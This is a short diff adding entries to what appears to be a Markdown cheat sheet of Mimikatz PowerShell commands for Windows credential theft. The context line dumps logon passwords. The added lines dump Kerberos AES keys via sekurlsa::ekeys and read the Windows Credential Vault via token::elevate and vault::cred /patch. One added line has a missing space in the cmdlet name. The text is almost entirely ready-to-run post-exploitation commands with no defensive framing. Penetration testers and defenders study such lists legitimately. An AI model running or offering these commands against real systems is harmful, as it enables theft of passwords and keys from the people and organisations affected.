@@ -19,3 +19,12 @@ logon password
 Invoke-Mimikatz -Command '"privilege::debug" "sekurlsa::logonpasswords" "exit"'
 ```
 
+AES cred
+```powershell
+Invoke-Mimikatz-Command '"sekurlsa::ekeys"'
+```
+
+Credential Vault
+```powershell
+Invoke-Mimikatz -Command '"token::elevate" "vault::cred /patch"'
+```
